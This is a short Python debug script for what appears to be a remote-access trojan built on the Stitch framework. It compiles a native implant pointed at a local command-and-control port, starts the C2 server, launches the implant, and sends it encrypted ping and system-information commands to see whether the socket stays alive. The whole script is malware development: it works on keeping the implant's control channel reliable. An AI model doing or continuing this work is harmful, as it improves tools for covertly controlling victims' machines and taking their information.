#!/usr/bin/env python3
"""
Test if NOT reading the response helps keep connection alive
"""

import os, sys, time, threading, subprocess, signal
sys.path.insert(0, '/workspace')

c2_port = 16500

# Compile
os.chdir('/workspace/native_payloads')
env = os.environ.copy()
env['C2_HOST'] = '127.0.0.1'
env['C2_PORT'] = str(c2_port)
result = subprocess.run(['bash', './build.sh'], capture_output=True, env=env, timeout=30)
print('✅ Compiled')

# Start C2
def run_c2():
    from Application import stitch_cmd
    server = stitch_cmd.stitch_server()
    server.l_port = c2_port
    server.run_server()
c2_thread = threading.Thread(target=run_c2, daemon=True)
c2_thread.start()
time.sleep(3)

# Launch payload
payload_proc = subprocess.Popen(['/workspace/native_payloads/output/payload_native'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
time.sleep(5)

from web_app_real import get_stitch_server
from native_protocol_bridge import native_bridge
import struct

server = get_stitch_server()
target_id = list(server.inf_sock.keys())[0]
sock = server.inf_sock[target_id]

print(f'Connected: {target_id}')

# Test: Send command but DON'T try to read response
print('\\nTest 1: Send ping WITHOUT reading response')
try:
    packet = native_bridge.create_command_packet(0x01, b'')  # CMD_PING
    if native_bridge._encrypt_and_send(sock, packet):
        print('  ✅ Sent successfully')
    else:
        print('  ❌ Send failed')
except Exception as e:
    print(f'  ❌ Exception: {e}')

# Wait a bit
time.sleep(2)

# Check socket
try:
    sock.getpeername()
    print('  ✅ Socket still valid after command 1')
except:
    print('  ❌ Socket disconnected after command 1')

# Send second command
print('\\nTest 2: Send sysinfo WITHOUT reading response')
try:
    packet = native_bridge.create_command_packet(0x03, b'')  # CMD_SYSINFO
    if native_bridge._encrypt_and_send(sock, packet):
        print('  ✅ Sent successfully')
    else:
        print('  ❌ Send failed')
except Exception as e:
    print(f'  ❌ Exception: {e}')

# Wait
time.sleep(2)

# Check socket again
try:
    sock.getpeername()
    print('  ✅ Socket still valid after command 2')
except:
    print('  ❌ Socket disconnected after command 2')

print('\\n--- Conclusion ---')
print('If socket stays valid: problem is in response reading')
print('If socket disconnects: problem is in payload command loop')

# Cleanup
try:
    os.killpg(os.getpgid(payload_proc.pid), signal.SIGKILL)
except:
    pass
